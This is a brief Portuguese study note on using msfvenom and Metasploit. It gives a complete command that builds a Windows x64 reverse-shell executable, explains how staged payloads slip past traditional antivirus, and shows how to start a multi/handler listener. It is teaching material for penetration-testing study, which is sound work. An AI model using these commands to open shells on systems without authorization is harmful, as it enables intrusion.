Encontramos tudo sobre payload
sintaxe padrão:
``msfvenom -p <PAYLOAD> <OPTIONS>``

para gerar uma reverse shell windows x64 em formato exe poderiamos usar:
``msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>``

- ``-f`` formato
- ``-o`` lugar do output
- ``LHOST=<IP>`` especifica o ip para conectar de volta
- ``LPORT=<port> `` porta na máquina local para se conectar de volta

## staged vc stageless

- **Staged:** payloads são enviados em duas partes. A primeira é chamada de stager. Esse é um pedaço de código que é executado diretamente no servidor. Ele concta de volta a um listener que está esperando, mas não realmente tem o código do reverse shell por conta própria. Ele usa a conexão para baixar o payload real, executando diretamente e impedindo que seja salvo no disco e pelas soluções tradicionais de anti-virus. Staged payloads requerem um listener especial.
- **Stageless:** contém tudo necessário para executar e gerar uma reverse shell para o listener. Eles são maiores e tendem a ser mais fácil de serem pegos pelo antivírus.


## Payload Naming Conventions
A convenção básica é a seguinte:
``<OS>/<arch>/<payload>``
Para windows de 32 bits omite-se o arch

Stageless payloads são marcados com underscores ``_``
Staged payloads são marcados com slash ``/``

Mostra os payloads disponíveis
``msfvenom --list payloads``

## Metasploit multi/handler
É uma ferramenta focada em pegar reverse shells. É essencial se você deseja usar meterpreter shells.
1. ``msfconsole``
2. ``use multi/handler``

``exploit -j`` inicia o comando como um trabalho no background
